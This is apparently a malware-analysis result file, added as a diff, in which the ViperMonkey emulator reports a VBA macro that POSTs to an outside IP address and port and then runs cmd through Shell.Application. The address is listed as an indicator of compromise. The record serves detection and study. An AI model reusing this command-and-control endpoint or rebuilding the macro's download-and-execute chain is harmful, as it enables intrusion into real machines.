@@ -1,0 +1,322 @@
+{
+  "extra": {
+    "drop_file": false,
+    "score": 410,
+    "sections": [
+      {
+        "auto_collapse": false,
+        "body": null,
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": null,
+        "promote_to": null,
+        "tags": {
+          "technique": {
+            "macro": [
+              "Contains VBA Macro(s)"
+            ]
+          }
+        },
+        "title_text": "Recorded Actions:",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "Action: Start Regular Emulation, Parameters: ",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": null,
+        "promote_to": null,
+        "tags": {},
+        "title_text": "All wildcard matches will match",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "Action: CreateObject, Parameters: ['WINHTTP.WinHTTPRequest.5.1']\nAction: .Open, Parameters: ['post', 'http://94.228.169.143:2351/bpzszuqi', False]\nAction: Open, Parameters: ['post', 'http://94.228.169.143:2351/bpzszuqi', False]\nAction: POST, Parameters: http://94.228.169.143:2351/bpzszuqi\nAction: POST, Parameters: http://94.228.169.143:2351/bpzszuqi\nAction: CreateObject, Parameters: ['Shell.Application']\nAction: CreateObject, Parameters: ['Shell.Application']\nAction: ShellExecute, Parameters: ['cmd', '**MATCH ANY**', '', '', 0, 'shell.application']",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": null,
+        "promote_to": null,
+        "tags": {},
+        "title_text": "Interesting Function Call",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "WinHTTPRequest function found by ViperMonkey",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 2,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 7,
+          "score": 100,
+          "score_map": {},
+          "signatures": {}
+        },
+        "promote_to": null,
+        "tags": {},
+        "title_text": "WinHTTPRequest Found",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "POST function found by ViperMonkey",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 2,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 8,
+          "score": 100,
+          "score_map": {},
+          "signatures": {}
+        },
+        "promote_to": null,
+        "tags": {
+          "network": {
+            "static": {
+              "ip": [
+                "94.228.169.143"
+              ],
+              "uri": [
+                "http://94.228.169.143:2351/bpzszuqi"
+              ],
+              "uri_path": [
+                "/bpzszuqi"
+              ]
+            }
+          }
+        },
+        "title_text": "POST Found",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "POST function found by ViperMonkey",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 2,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 8,
+          "score": 100,
+          "score_map": {},
+          "signatures": {}
+        },
+        "promote_to": null,
+        "tags": {
+          "network": {
+            "static": {
+              "ip": [
+                "94.228.169.143"
+              ],
+              "uri": [
+                "http://94.228.169.143:2351/bpzszuqi"
+              ],
+              "uri_path": [
+                "/bpzszuqi"
+              ]
+            }
+          }
+        },
+        "title_text": "POST Found",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "Action: Object.Method Call, Parameters: ['post', 'http://94.228.169.143:2351/bpzszuqi', False]",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": null,
+        "promote_to": null,
+        "tags": {},
+        "title_text": ".Open",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "Action: Execute Command, Parameters: cmd **MATCH ANY**",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 2,
+          "score": 100,
+          "score_map": {},
+          "signatures": {}
+        },
+        "promote_to": null,
+        "tags": {},
+        "title_text": "Shell function",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "http://94.228.169.143\n94.228.169.143:2351",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 4,
+          "score": 10,
+          "score_map": {},
+          "signatures": {}
+        },
+        "promote_to": null,
+        "tags": {
+          "network": {
+            "port": [
+              "2351"
+            ],
+            "static": {
+              "ip": [
+                "94.228.169.143"
+              ],
+              "uri": [
+                "http://94.228.169.143"
+              ]
+            }
+          }
+        },
+        "title_text": "ViperMonkey has found the following IOCs:",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "CreateObject: Creates and returns a reference to an ActiveX object.\nMsgBox: Displays a message in a dialog box, waits for the user to click a button, and returns an Integer indicating which button the user clicked.\nShellExecute",
+        "body_config": {},
+        "body_format": "MEMORY_DUMP",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": null,
+        "promote_to": null,
+        "tags": {},
+        "title_text": "VBA functions called",
+        "zeroize_on_tag_safe": false
+      }
+    ]
+  },
+  "files": {
+    "extracted": [],
+    "supplementary": [
+      {
+        "name": "vipermonkey_output.log",
+        "sha256": "fed5862f9cc0d9da83d4abb75b6cf3543ab3fd02a62b11f05b27e79f0422e4b7"
+      }
+    ]
+  },
+  "results": {
+    "heuristics": [
+      {
+        "attack_ids": [],
+        "heur_id": 2,
+        "signatures": []
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 4,
+        "signatures": []
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 7,
+        "signatures": []
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 8,
+        "signatures": []
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 8,
+        "signatures": []
+      }
+    ],
+    "tags": {
+      "network.port": [
+        {
+          "heur_id": 4,
+          "signatures": [],
+          "value": "2351"
+        }
+      ],
+      "network.static.ip": [
+        {
+          "heur_id": 8,
+          "signatures": [],
+          "value": "94.228.169.143"
+        },
+        {
+          "heur_id": 8,
+          "signatures": [],
+          "value": "94.228.169.143"
+        },
+        {
+          "heur_id": 4,
+          "signatures": [],
+          "value": "94.228.169.143"
+        }
+      ],
+      "network.static.uri": [
+        {
+          "heur_id": 4,
+          "signatures": [],
+          "value": "http://94.228.169.143"
+        },
+        {
+          "heur_id": 8,
+          "signatures": [],
+          "value": "http://94.228.169.143:2351/bpzszuqi"
+        },
+        {
+          "heur_id": 8,
+          "signatures": [],
+          "value": "http://94.228.169.143:2351/bpzszuqi"
+        }
+      ],
+      "network.static.uri_path": [
+        {
+          "heur_id": 8,
+          "signatures": [],
+          "value": "/bpzszuqi"
+        },
+        {
+          "heur_id": 8,
+          "signatures": [],
+          "value": "/bpzszuqi"
+        }
+      ],
+      "technique.macro": [
+        {
+          "heur_id": null,
+          "signatures": [],
+          "value": "Contains VBA Macro(s)"
+        }
+      ]
+    },
+    "temp_submission_data": {}
+  }
+}
